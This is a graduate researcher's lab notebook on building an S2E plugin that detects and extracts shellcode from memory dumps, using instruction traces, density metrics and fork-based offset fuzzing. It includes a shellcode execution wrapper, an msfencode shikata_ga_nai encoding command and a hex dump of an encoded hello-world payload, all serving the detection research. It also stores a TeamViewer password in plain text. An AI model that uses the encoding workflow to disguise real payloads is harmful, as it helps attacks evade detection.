-------------------------------Work since 9 Aug 2012
Done:
Get a pristine version of S2E-demo
Test demo (worked)
Install VMware Workstation -> didn't install so used VirtualBox
Copy all files off mucked up VM, list of patched files, and any notes needed (home dir, /usr/local/src, inside kate)
Add a virtual disk to S2E-demo to encap=/sulate any changes I make
Copy all files to S2E-demo spare disk
Install any Vbox add ons
Test demo (worked)
Build S2E in home directory
Test demo with build version (worked)
Copy pristine to a muckable copy (within ~/s2e/dasos/s2e)
Build muckable copy
Test muckable's demo
Build and ensure s2e boots with InsnTracker
Apply patches to muckable's s2e 
Build and test mucked-s2e
Install Syscall tracker
Test demo with new s2e
Test Syscall tracker 


Notes:
Within s2e home dir is a dir named s2e, this is all the demo code. I kept it pristine.
Within ~/s2e I put a symlink for the spare disk, the symlink is called ~/s2e/dasos and the disk is mounted to /mnt/RJFDasos which is /dev/sdb1 (formatted as ext3) which is a .vmdk of 10 GB. Within ~/s2e/dasos I copied ~/s2e as ~/s2e/dasos/s2e, this is the directory to muck with code in.

Cmd tracker:
cd ~/s2e/build - where the make file is
make - build the pristine version
launch - test it
mkdir ~/s2e/dasos/s2e - make a place to muck it up
cp -R ~/s2e/* ~/s2e/dasos/s2e/. - make a version to muck up
cd ~/s2e/dasos/s2e/build
make
changed all the scripts to use the modified path
edited according to the patch file and previous edits
edited s2e/s2e/qemi/Makefile.target to use plugins
../buildPluginsQuick.sh to test build
../buildPlugins.sh to do it for real



------------------------------Meeting notes 16 Aug 2012
Make preproc- find first syscall given ptr to buffer (return syscall number and addr), if no syscall return 0
on each insn len+=insn.len, store addrs in a cookie trail
given a buffer addr, make a variable that jumps to an offset within the buffer, make it symbolic so that s2e explores all possible offsets
determine which insns can write to memory, note those locations to make them symbolic values
Conditions:
1) Online: 1st syscall number and addr must match
2) Online: Insns must align
3) Offline: Total len > 15B
4) Offline: Current set of insns must not be a subset of previously captured insns
5) Offline: Every byte should be executed [at most/not more than] once

Design considerations:
-Track exeuction addresses and byte values
-On success output: addr and byte values of executed insns; syscall number; syscall addr

Deliverables:
-Preproc
-Port Valgrind method to S2E (for now, online features)



-------------------------------Work since 16 Aug 2012
Todo:
s2eget wrapper to exit via s2e on 1st system call
make the offset variable symbolic (modeling after fork and kill)

make backups and bring into GMU with me

done:
create and test s2eget (start with fresh booted s2e.raw with nons2e)
stop, savevm s2e-waiting, and exit vm
convert to qcow2, make DNM (Do Not Modify) copy
make Valgrind preproc code available to S2E VM
s2eget the shellcode wrapper program and exec built-in hello world
be able to execute shellcode with a variable that controls the offset within the buffer

Notes:
qemu suspend:
-Raw does not support this, qcow2 does.
-Press ctrl+alt+shift+2 for command mode.
-type: stop (to stop the vm execution); savevm <tag name> (saves memory/suspends to a tagged name that you can reference later); exit (to exit qemu).
-This does not create a separate snapshot file; instead the snapshot exists within the qcow2
-I am uncertain if you can use the disk with different snapshots or if there shouldn't be any changes made to disk (eg only use the disk for a single snapshot)
-To recall the snapshot use the -loadvm <tag name> command line arg when rerunning 

s2eget:
This program coordinates with an s2e plugin HostFiles. You give HostFiles an option in the config/lua for which directory s2eget can read. Then you run s2eget in the VM. If the VM is not in S2E mode, then it waits (ie so you can suspend it). If the VM is in S2E mode it reads the directory on the host for the file and writes it to the guest.
I have it read a tarball that is extracted and then a script from the tarball is ran. The tarball must be named pkg.tar and it must have contain a directory called runtime.dir that contains firstRan.sh. 



-------------------------------Work since above, Meeting notes 13 Sept 2012
Gave demo of S2E. Had issues with symbolically executing a variable. It did not seem to work like it should. Dr. Wang also saw how it did not work like it should. We expected it to branch at each condition that involved the symbolic variable, particularly whenever a branch contained a get_example (). However, only a branch would execute and the original state would act as if frozen. We decided to see if I could manually iterate a variable for all wanted values, and for each value create a state that S2E could manage (so we can still leverage their tools).

Deliverables:
-Be able to iterate through offset

Todo:
get DasosPreproc to fork new states


Done:
There is a lot to summarize here. Much is in the google drive document.
shellcode-wrapper uses a custom instruction to tell DasosPreproc plugin what memory range to listen to and what the EIP is
DasosPreproc uses that custom insn to track the PID and mem range and stops execution of the state when the first system call in the mem range is detected
offset variable cannot be symbolic, so I have developed a fuzzing extension to the DasosPreproc module, you put a custom insn as the assignment for any unsigned int and use the parameters to specify the range. 
It successfully modifies the variable. I tested this by setting the variable to 99 in userspace, calling the fuzz with range 5 to 5. The preproc detected that this was the final iteration and returned 5. Userspace then printed out that the value was 5. I also tried the same but when initialized the original state was suspended, and then resumed when fuzz_next was called and it was determined that it was the final state.


Notes:
A state is a klee branch of symbolic execution
I had difficulties writing/reading memory from the process directly. It as much easier to return the value in a register and then let userspace assign.



------------------------------Meeting notes 20 Sept 2012
Virtual Box is incompatible for our needs, forking fails in it.
Switch to VMware Workstation 9 with a trial license and Dr. Wang will buy a license shortly.



------------------------------Work since 20 Sept 2012
Downloaded VMware Workstation and got 30 day license
Downloaded S2E VM
Untared S2E VM into /home/rfarley3/VirtualMachines (it creates a var/s2e/vms directory where you find the s2e-demo vm)
Created a /home/vmware/vm, and added group vmware (adding rfarley3 to that group) and then chmod 775 and chown rfarley3:vmware to /home/vmware
Started vmware over ssh-x, loaded s2e-demo/S2E.vmx
Made snapshot "Untouched"
Started VM, tested ./launch (forks and kills)
Reverted to snapshot "Untouched"
Added shared folder /home/rfarley3/Downloads/dasos called hostrw (under /mnt/hgfs/hostrw)
Added USB functionality
Added 20GB HDD called S2E-rjf.vmdk
Made a snapshot "hardware and shared folders set up"
Booted, mkdir /mnt/RJFDasos, ln -s /mnt/RJFDasos ~/s2e/dasos, sudo fdisk /dev/sdb (new, primary, #1, 1-2610, write), sudo mkfs.ext3 /dev/sdb1
Added this to /etc/fstab: 
/dev/sdb1       /mnt/RJFDasos   ext3    defaults        0       1
sudo mount /dev/sdb1
sudo chown -R s2e:s2e /mnt/RJFDasos
rsync -rptv /mnt/hgfs/hostrw/Attempt2/* /mnt/RJFDasos/.
ln -s s2e/s2e/qemu/Makefile.target PluginsMakefile
Went online and downloaded teamviewer
Edited backup.sh to use Attempt3, clean out old items, ./backup.sh
Made snapshot tmp
Teamviewer has dependencies, use Ubuintu Software Center to install it (find teamviewer_linux_x64.deb in nautilus and double click it), you may get an error to fix broken dependencies on the system, allow it.
Set /usr/bin/teamviewer7 as a start up item (disable bluetooth, evolution, power manager, print queue applet, remote desktop, ubuntu one, update notifier, visual assistance).
Ran teamviewer and set it up to auto login, accept incoming lan connections, gave it a predefined password ?"}|\]'/, changed strength to 6 characters  "
On remote computer login with teamviewer, in computers and contacts click on the add partner (looks like a bust), select ID (computer) put in the ID, alias and leave the password blank.
Made snapshot temp, delete tmp
Shutdown, Make bridged networking, add mac address (00:0c:29:10:d3:9c) into dhcp server (airport utility, network, change 10.0.1.61:s2e-demo's mac.
Test boot within Gui, see if it boots, ran s2e over teamviewer
sudo apt-get install kate vim openssh-server
Test ran s2e fork and kill again
Made Base Environment Complete, delete temp, suspend, exit workstation, go headless (vmrun start <vmx> nogui)
Made a diff/patch between my source and untouched source to find out how many changes, I've made, try to reverse as many as possible.
Reverted /qemu/s2e/S2EExecutionState.h, /qemu/s2e/S2EExecutionState.cpp, /qemu/s2e/S2EExecutor.cpp to original (before me, untouched, etc) versions.
Made copies and let makefile handle syncing of the following:
s2e@ubuntu:~/s2e/dasos$ cp PluginsMakefile ./Plugins-Makefile.target
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/exec-all.h ./qemu-exex-all.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugin.cpp ./PLugins-Plugin.cpp
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugins/Opcodes.h ./Plugins-Opcodes.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/s2e/Plugins/ExecutionTracers/TraceEntries.h ./ExecutionTracers-TraceEntries.h
s2e@ubuntu:~/s2e/dasos$ cp s2e/s2e/qemu/target-i386/translate.c ./i386-translate.c
s2e/Plugins/ExecutionTracp s2e/s2e/guest/include/s2e.h ./guestinclude-s2e.h
Now should the source tree get written over or lost, the versions that I edited will persist in my devel directory. Note that now all edits to any of the above must be done within the devel directory, and if any further files in the source tree need to be edited, then move them into the devel directory and make a makefile publish target for them as well.
The directory structure of the devel dir was significantly changed to be clearer, makefile was changed to match.
When files were copied to the VM symlinks were lost within dasos/s2e/build and I had to make a script to manually enumerate the symlinks and match them up to the existing files and then recreate those symlinks within our copy of the source. The script to do this is getsyms.sh.
Makefile targets tested: publish, build-test, build, test.
Put tut1 onto Vitaly's VM. (cd ~/s2e; launch; scp -P 2222 dasos/Tutorial1/tut1retry.c 127.0.0.1:~/s2e/.)
Tried it on our VM (make tut1-run). 
Made stubs iteration, at first tried to do an iterative based on saving state0 and then forking each time from it, however, s2e would resume state0 implicitly and then I'd loose my pristine state0 to fork from
Made a new iterative that forked all at once, this worked, but would die at 1000+ states. I tried max memory at 1.2G, 700M, 500M, 200M and none worked.
Finally made an iterative fork that would fork state0 and return state1 with a given value and return state0 with a canary value. s2e always executes forked states before original states, so I made it run depth-first-search; thus state1 must finish before it rturns to state0. State0 just loops to the next value and forks for it, repeat. 



------------------------------Work since 2 Oct 2012
When I moved to shellcode-wrapper I got segfaults that prevented the state from getting a s2e_kill (), so I made a s2ekill.c and call its binary within firstRan.sh after the guest code I wish to observe, thus any zombies/orphans are killed by it and the DFS can continue.
Ran this together and got this result:
s2e@ubuntu:~/s2e/dasos$ grep "EIP" s2e-last/debug.txt
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
62 [State 1] Terminating state 1 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
68 [State 3] Terminating state 3 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
69 [State 4] Terminating state 4 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b004 at addr 0x804b08e from pid: 86716416
74 [State 6] Terminating state 6 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b087 at addr 0x804b08e from pid: 86716416
80 [State 8] Terminating state 8 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b089 at addr 0x804b08e from pid: 86716416
86 [State 10] Terminating state 10 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08a at addr 0x804b08e from pid: 86716416
86 [State 11] Terminating state 11 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08c at addr 0x804b08e from pid: 86716416
92 [State 13] Terminating state 13 with message 'EIP reached, success'
>> EIP Found. Syscall number 804b08e at addr 0x804b08e from pid: 86716416
97 [State 15] Terminating state 15 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
114 [State 22] Terminating state 22 with message 'EIP reached, success'

Modified custom insn to pass the syscall number so I can have the plugin enforce that they match
This allowed me to filter out false successes, now get:
s2e@ubuntu:~/s2e/dasos$ grep "EIP" s2e-last/debug.txt
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
27 [State 1] Terminating state 1 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
30 [State 3] Terminating state 3 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
30 [State 4] Terminating state 4 with message 'EIP reached, success'
>> EIP Found. Syscall number 4 at addr 0x804b08e from pid: 86716416
56 [State 22] Terminating state 22 with message 'EIP reached, success'


Here is a list of what our Valgrind tool can do:
Code:
// now see if this insn's last byte precedes the EIP, ie this was where we caught it
if (insnAligns (bb->stmts[i]->Ist.IMark.addr, bb->stmts[i]->Ist.IMark.len) )
   if (shell_len > 15 && byte was not executed within another shellcode string () )
// if this loop has gone on long enough, then exit
if (shell_exec_cnt[bb->stmts[i]->Ist.IMark.addr - shell_base] > 100) {
// if not the insn before the captured syscall, then peek ahead, see if the next instruction is a system call, if so, then exit
// note that this doesn't catch shell code which jumps to a syscall
if (bb->stmts[i]->Ist.IMark.addr != (eip - 2 - bb->stmts[i]->Ist.IMark.len) && isAddrSyscall (bb->stmts[i]->Ist.IMark.addr + bb->stmts[i]->Ist.IMark.len) ) {

Online:
-Enforces EIP alignment: Reports 1st occurrence of an insn that precedes (physically, not logically) a system call that aligns with EIP
-Stores executes byte addresses in a cookie trail
-Analyses cookie trail to make sure total executed bytes > 15B
-Any byte should be executed [at most/not more than] once
-If in a loop more than 100 times abort
Offline:
-Each cookie trail (set of insns) must not be a subset of previously captured insns (enclosure)
-Report back the cookie trail with the highest density (number of executed bytes divided by (the highest address minus the lowest address))


Currenlty, how does that relate to our S2E tool:
Online:
+Enforces EIP alignment: Reports true 1st syscall and verifies that the system call number matches
Offline:
-nothing

What I need to do:
-Track executed bytes
   -Enforce tot > 15
   -Enforce that a string (a cookie trail of executed bytes) is not a subset of earlier successful strings
   -Detect infinite loops and abort
   -Report a density function

Incorporated code from InstructionCounter.cpp which uses ExecutionTracer (I was thinking of using this anyways). I set it up that when the custom insn is called, a callback is set on every instruction. At each instruction it is determined if it is within the shellcode, if so, then a counter is incremented. So, while we don't do a Byte counter we still have a metric for length.

4 Oct
Ignore minimum instruction count requirement, need more data to make an educated guess on value.
Added PC tracking vector
Added vector to store all successful runs (a vector of PC tracking vectors)
Added filter to not store any match whose PC tracking vector is a subset of any successful run element
There was an issue with signals from the code I copied in yesterday so I simplified it
It was still attempting to store PCs multiple times, so I added a filter that only appends PCs if they do not equal the last PC stored (not that it should be impossible for AMS to execute the same insn immediately after itself anyways). I believe that it did this bc the ASM insn was broken down into multiple LLVM IR insns, such that the onTranslateInsn was called (for some reason) at every LLVM IR insn which was associated with the single ASM PC addr.

Currenlty, how does that relate to our S2E tool:
Online:
+Enforces EIP alignment: Reports true 1st syscall and verifies that the system call number matches
+Enforces count of instructions instead of Bytes (this is not enabled currently)
+Does an online enforcement that any success is not a subset of a previous success
Offline:
-nothing

What I need to do:
-Track executed bytes
   -Detect infinite loops and abort (the point to insert this code is noted)
   -Report a density function (for this I'd need to know all the bytes used instead of just the first byte of the insn).


Main todo: see if I can extract the actual insn and all its bytes or at minimum its length
Make a visual memory map output

5 Oct
Made a memory map. The index is the PC-base, it is a vector of vectors of vectors. The first vector is the index of PC-base. The second is for each time that PC is called. The third is for the byte values for each instance the PC is called.
If mem_map[pc-base].size > 3 then that PC has been executed 3 times, abort predicting that it is in an infinite loop. Ideally this should analyze the loop and find if all PCs' intances' byte values are the same (therefore infinite loop and not polymorphic shellcode).
Made a visual memory map output, but it's not complete bc I need to be able to read the values raw from memory
Made a visual indicator if PCs were executed more than once

To do:
Be able to get the raw memory values for the insns: print them in the PC cookie trail debug output and store them in the mem_map
Extend visual indicators to see if any bytes at PCs were changed (to denote if anything self modifying)
Print ascii values in mem_map
Print disasm strings in mem_map
Print a memory map that shows the order of the bytes being called on a memory map
Report a density function



/home/s2e/s2e/dasos/s2e/./s2e/qemu/i386-dis.c <- dissassembler "e function returns the length of this instruction in bytes"
/home/s2e/s2e/dasos/s2e/./s2e/qemu/dis-asm.h
/home/s2e/s2e/dasos/s2e/./s2e/qemu/target-i386/translate.c
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:/** A type of a signal emitted on instruction execution. Instances of this signal
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:            uint64_t /* ending instruction pc */,
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:    /** Signal that is emitted on code generation for each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/Plugins/CorePlugin.h:            uint64_t /* instruction PC */>
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_tcg_custom_instruction_handler(uint64_t arg);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by the translator when a custom instruction is detected */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_tcg_emit_custom_instruction(struct S2E* s2e, uint64_t arg);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by cpu_gen_code() before translation of each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_on_translate_instruction_start(
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:/** Called by cpu_gen_code() after translation of each instruction */
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/s2e_qemu.h:void s2e_on_translate_instruction_end(
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct TCGLLVMTranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct S2ETranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/exec-all.h:struct TranslationBlock {
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.h:struct TranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.h:struct S2ETranslationBlock
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.h:    struct TranslationBlock;
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.h:struct S2ETranslationBlock;


translate.c <- insn handler

/* convert one instruction. Return the next pc value */
i386-translate.c:static target_ulong disas_insn(DisasContext *s, target_ulong pc_start):4231
 next_byte:
    b = ldub_code(s->pc);
    s->pc++;
same file line 1000
typedef struct DisasContext {
   ...
    target_ulong pc; /* pc = eip + cs_base */  // RJF This is the current byte that the disasm is working on (s->pc)
    /* current block context */
    target_ulong cs_base; /* base of CS segment */ // RJF what is this?
    struct TranslationBlock *tb; // Look, it has a tb built into it, can we use this to pass info to S2E?

We really want  tb->size to survive, look how in translate-all.c it stores: s->code_in_len += tb->size; to survive.
s is TCGContext *s = &tcg_ctx;  global within translate-all.c
The actual ASM to Qemu IR is done by this: gen_code_size = tcg_gen_code(s, gen_code_buf);


Tracking tb->size leads to /home/s2e/s2e/dasos/s2e/./s2e/qemu/target-i386/translate.c:    gen_intermediate_code_internal(...); tb->size = pc_ptr - pc_start;

s2e_oTI_start is 8043, but tb_.size isn't set until 8128 (if !search_pc) is this a way to do dry runs or something?
So instead link in at on_TranslateInstruction_End... 
static inline void gen_instr_end(DisasContext *s)
{
    if (!s->done_instr_end) {
        s2e_on_translate_instruction_end(g_s2e, g_s2e_state, s->tb, s->insPc, s->useNextPc ? s->nextPc : (uint64_t)-1);
        s->done_instr_end = 1;
    }
}

Added exec-all.h:223 within struct TranslationBlock: 
    uint8_t lenOfLastInstr; /* XXX: RJF, allows translate.c to report back instruction length */
Added i386-translate.c:4231-4235 within disas_insn:
    s->tb->lenOfLastInstr = 0; // RJF
 next_byte: 
   ...
    s->tb->lenOfLastInstr++; // RJF

I had to extend this for every time s->pc was incremented in all functions of the file. It worked.
I added ascii output to mem_map
The output reports a density function
shellcode wrapper can accept a limit on the cases of offsets it runs (for debug testing)

To do:
Print disasm strings in mem_map

Make a README that describes the directory and its files
Make a README for subdirectories that are confusing, like DiskImgs




------------------------------Meeting 9 Oct 2012
Make a multi snapshot mem_map
Finish by end of week
Start working on related work and turn into the comprehensive reading list, needs to be done within 2 wks and do the comp by Dec 1 (before exam business for the profs)
Once down with readling list do tech section of a paper on this topic to turn into proposal, get down with it by mid-december to do proposal by early january


There are three original goals:
1) Find exploit code
2) Find exploited function or buffer
3) Find original attack string

The proposal will probably consist of finishing the 3 goals and extending our product to work on windows




------------------------------Work since 2 Oct 2012
Oct 10 work since meeting
Extended visual indicators to show if any bytes within a snapshot were executed multiple times
Extended the memory map to have snapshots whenever a byte is modified
Cleaned up the trace interface
Note that the desnity function is only done per snapshot, so if polymorphic is done, then we need to extend it to take the fact taht the density needs to be calc'ed over multiple snapshots: my idea is to do a foreach i 0..len { foreach j 0..snapshots { if mem_map[j][i].times_execed > 0 { num_bytes_execed++; if i < min, min = i; if i > max, max = i; } } } So we superimpose all snapshots together, finding the min addr and max addr amonst all, and then the size of the set of unique executed pcs/byte_offsets (size of the union of each snapshot's set of i}. In other words if snapshot1 did 0 to 10 and snapshot2 did 5 to 15, then min is 0, max is 15 and num_bytes_execed is 15 {0..15}; another example s1:5 to 10; s2:8 then jmp to 1 to 3; s3:1 then jmp to 12 to 15; min is 1, max is 15, num_bytes_execed is 12 {1..3,5..10,12..15}.

got the data struct going:
// keep track of insns executed
// make an array of insns that become a trace
// start by defining an insn, leverage memory snapshots to avoid duplicating data
struct insn_instance {
   uint32_t snapshot_idx;  // which snapshot
   uint64_t pc;            // offset/pc of insn NOTE: within the snapshot (ie pc - cfg.base_addr)
   uint16_t len;           // num bytes of insn
   //Store insn byte string... Maybe? Or llvm ir decoding? Or disasm?
};

// as insn are executed, add them to mem map snapshot stack,
//and then note which stack index as well as the pc and byte len within index
typedef std::vector<struct insn_instance> Trace;

// keep track of memory bytes executed as a memory map
// but they can change, so anytime a previously execed byte changes, make a new empty snapshot and start filling it in
// ie make a stack of snapshots
// start by making the basic element
struct mem_byte {
   uint8_t byte;           // value of this byte
   unsigned times_execed;  // times this byte was executed (eg if it is uninitialized or were in a loop)
};

// make an array of mem_bytes the length of the input buffer
typedef std::vector<struct mem_byte> Snapshot;

class DasosPreprocState: public PluginState {
private:
   // an array of insn pcs (plus lens and corresponding snapshots) appended as executed (in order of execution)
   Trace trace;
   
   // a stack of snapshots
   std::vector<Snapshot> mem_map;

End of Oct 10:
Get dasosUdcli compiled so I can have disasm print outs
do some find within buffer tests of live dumps; do some collisions (random buffers); do some poly morphic tests


End of Oct 12:
Incorporated libudis86 into the plugin. You must add -ludis86 to the libs+= in the plugins makefile. And store the raw assembly into a uint8_t array (the var named raw below) and then the following fn will take care of the callbacks udis86 needs: ud_set_input_buffer(&ud_obj, raw, len);
Made a successes stack to track successes, and then when the guest finishes it can call s2e_dasos_preproc_fini to get the plugin to output any stats or other data that it has. I started making all the accessors work independently of a "state" and expanded the successes into a struct to hold stats data. I got it to compile and it successfully finds all the same successes, but all my debug output has disappeared... OK it's back. Outputting maximum density doesn't seem to work, bc I haven't yet calc'ed the overall density.

Todo: 
-Make the success's density function
-Run the preprocessor on the ghttpd dump


End of Oct 16:
Made a success density function. Remember that a success contains a memory map. There are two types- average: which is the sum of the snapshot densities divided by the number of snapshots; and overlay: which is the number of unique executed bytes across all snapshots divided by the range across all snapshots (the maximum PC from any snapshot minus the minimum PC in any snapshot). Average is a good inidcator of well grouped snapshots that might be spaced distantly (shellcode that jumps alot or is broken up across lots of memory); Overlay is good for shellcode which is clumped together and removes densities impacted by large jmps within the single code block.
I modified alot of the code to be clearer and reduced the number of functions, primarily by removing calls to objects within DasosPreprocState that were also within DasosPreproc.

I started to get the packer going. I downloaded UPX and then brought over the libDasosf code to be able to make collision tests and read in raw code. There is a file called fakeDumpGen that reads in a shellcode, it'd be good to incorporate UPX into that. Also consider adding the capability for our system to work without an EIP, or for it to extend the monitored memory ranges on the fly (in case a write extends the buffer beyond monitored range). Perhaps put it into shellcode-wrapper...

Integrated fakeDupmGen.c and then try some packing. Work from line 122 to 160, what is decodeShell? and storeIntoShell?
i stopped trying to get shellcode wrapper compiled, type conversion errors and somthing to do with the enum in a switch


End of Oct 23:
Modified DasosPreproc.cpp to handle eip=0 and syscall_num=1024 (neither being set)
Worked out some Makefile stuff
Ran test with helloworld and eip set, success
Ran test with helloworld and eip not set, hang at offset 30, didn't do it again... ?, success
Ran test with hw and eip nor syscall set, success
Converted dasosfDumpPrint.c to new system (small mods like removing libdisasm (libbastard))
Ran sw and output hello to dump file, success; raw file, success
I went to run the dump of HW and after a while S2E gave memory errors.

Notes:
I may need to consider the case when the insn is a jmp or write to out of specified range: if so, then extend monitored mem range.
There may be a compatibility issue going back and forth between 32 and 64b systems for the size of the addresses.


End of Oct 24:
./dasosf -p -x                               # print hw, exec hw
./dasosf -p -o hw -r -x                      # print hw, output hw.rawshell, exec hw
./dasosf -i hw.rawshell -p                   # input hw.rawshell, print it, do not exec it
./dasosf -i hw.rawshell -x                   # execute hw.rawshell
./dasosf -p -o hw -x                         # print hw, output hw.dump (with eip/syscall), exec hw
./dasosf -i hw.dump -p                       # input hw.dump, print it, do not exec it
./dasosf -i hw.dump -x                       # execute hw.dump
./dasosf -i hw.dump -o hw2 -r -p             # input hw.dump, print hw.dump, output hw2.rawshell, do not exec hw.dump 
                                             # (note that hw2.rawshell is the raw dump of hw.dump.shell (so it includes the filler)
# hw2.rawshell should match hw.dump.shell    # YES
./dasosf -i hw.rawshell -o hw2 -p            # input hw.rawshell, print hw.rawshell, output hw2.dump (no eip/syscall), do not exec hw.rawshell
# hw2.dump should show diff eip than hw.dump # YES
./dasosf -i hw.rawshell -e 16 -o hw3 -p      # input hw.rawshell specify eip, print hw.rawshell, output hw3.dump, do not exec hw.rawshell
# hw3.dump should show same eip as hw.dump   # YES
./dasosf -p -o hw4 -t r                      # print hw, output hw4.dump with random fill, do not exec
./dasosf -i hw4.dump -p                      # should have random fill YES
./dasosf -i hw.rawshell -o hw5 -t r -p       # input hw.rawshell, print hw.rawshell, output hw5.dump (no eip/syscall) with random fill, do not exec 
 
Do an S2E run with inputed dump/raw hw, with/without eip
./shellcode-wrapper -x                           # test default
# Why doesn't brute force find the 2nd syscall within HW <- it does
# YES
./shellcode-wrapper -i hw.rawshell -e 16 -x      # test inputting a rawshell (with eip)
# YES
./shellcode-wrapper -i hw.rawshell -x            # test inputting a rawshell (without eip/syscall)
# got error that eip was known... due to not removing setting if source_type changed from HW. fixed. 
# YES
./shellcode-wrapper -i hw.dump -f 496 -c 22 -x   # test inputting a dump (with eip/syscall)
# was not doing more than 1 fork... needed to make a temp var to store return from fuzz_fork. fixed.
# YES
./shellcode-wrapper -i hw2.dump -f 496 -c 40 -x  # test inputting a dump (without eip/syscall)
# incorrect shellcode to dump creation gave a false eip, fixed. dump input didn't consider case when eip is unknown, fixed.
./shellcode-wrapper -i hw2.dump -x               # test inputting a dump (without eip/syscall) and no offset/cases
# KLEE reported memory cap issues, so commented out two lines in .lua: 
      --"--max-memory-inhibit=true",
      --"--max-memory=700",
# YES, ran 1024 states in 915 seconds
./shellcode-wrapper -i hw4.dump -x            # test inputting a dump (with eip/syscall) with rand fill
# froze on state 70. make a disasm for offsets as an option for print, also the eip seems wrong (figure out linker stuff in makefile and try out -d x,y cla)
# disasm didn't help much, but there was an odd jmp, so I followed a hunch to have our system kill any insns that run out of bound of our module we monitored
# At the end of every insn, need to test if the next PC is within the module, if not, then terminateEarly.
# it found many that jumped out of bounds and dramatically sped up our system, ran 1024 states in 558 seconds
# Found true HW, but with two prepended vestigal insns
./shellcode-wrapper -i hw5.dump -x            # test inputting a dump (without eip/syscall) with rand fill
# found 3 scodes, but density of legit one was order of magnitude more dense (.10 and .18 vs .80+)

I made a normalizeShellcode function which acts as a preprocessor. The S2E plugin detects if the syscall happens in state[0], if so, it calls onFiniPreproc which outputs the success (since there should be only 1). normalizeShellcode is nearly the same as execShellcode, except it doesn't do symbex offset. However, the user can specify an offset. It is also extensible enough that the user could specify the eip or sysc should they have it, but since the s2e plugin works without them, they don't seem necessary at the moment.

Pack outputted hello and run

Install Metasploit to use msfencone and shikata-ga-nai encoder, follow these instructions: http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html

I encoded the default: msfencode -c 1 -i msfe-in.rawshell -t raw -o msfe-out-sganai.rawshell -v -e x86/shikata_ga_nai
And then tested it with 
[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./dasosf -x -i msfe-out-sganai.rawshell 
<< Requesting execution
Shell start_addr: 0xff900e60, +512: 0xff901060, length: 68B, range: 68B, end_addr: 0xff900ea3
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xff900e60 dad4b892 ba1e5cd9 7424f45b 29c9b10b  ......\.t$.[)...
0xff900e70 83c30431 43140343 8658ebb7 b5c52588  ...1C..C.X....%.
0xff900e80 09f174d3 2acba451 a3e6c926 bab304c6  ..t.*..Q...&....
0xff900e90 54ab6838 5b64f2ab cf1ad013 788a5a38  T.h8[d......x.Z8
0xff900ea0 e27591cd                             .u..            

<< Calling shell: 0xff900e60 (adjusted by offset of 0), of len: 68 with eip: 0x00000000 (7336352) and syscall: 1024
Hello, world!

So it works, but then when I run it in the preprocessor it goes out of bounds...
21 [State 0] Message from guest (0xbfa085ec): << Within normalizeShellcode with params, f: 0
21 [State 0] Message from guest (0xbfa085ec): << About to call dasospreproc_init with shell: 0xbfa08f90 (offset of 0 not yet applied), shell_len: 68
21 [State 0] Warning: EIP is not set, there may be false positives
>> Recv'ed custom insn for a DasosPreproc memory segment within pid 107851776, addr range: 0xbfa08f90-0xbfa08fd4 with eip: 0x0 buffer length: 68 and syscall number: 1024
21 [State 0] ERROR: we've left our module/shellcode, just ran insn @0xc1270c69, terminateStateEarly
>> Printing PC Trace (instructions in order of execution)
>>      1   1B @0xbfa08f90:*da                invalid                 
>>      2   2B @0xbfa08f90:*da d4             fcmovbe st0, st4        
>>      3   5B @0xbfa08f92: b8 92 ba 1e 5c    mov eax, 0x5c1eba92     
>>      4   4B @0xbfa08f97: d9 74 24 f4       fnstenv [esp-0xc]       
>>      5   1B @0xbfa08f9b: 5b                pop ebx                 
>>      6   2B @0xbfa08f9c: 29 c9             sub ecx, ecx            
>>      7   2B @0xbfa08f9e: b1  b             mov cl, 0xb             
>>      8   3B @0xbfa08fa0: 83 c3  4          add ebx, 0x4            
>>      9   3B @0xbfa08fa3: 31 43 14          xor [ebx+0x14], eax     
>>     10   3B @0xbfa08fa6:  3 43 86          add eax, [ebx-0x7a]     
>>     11   1B @0xbfa08fa9: 58                pop eax                 
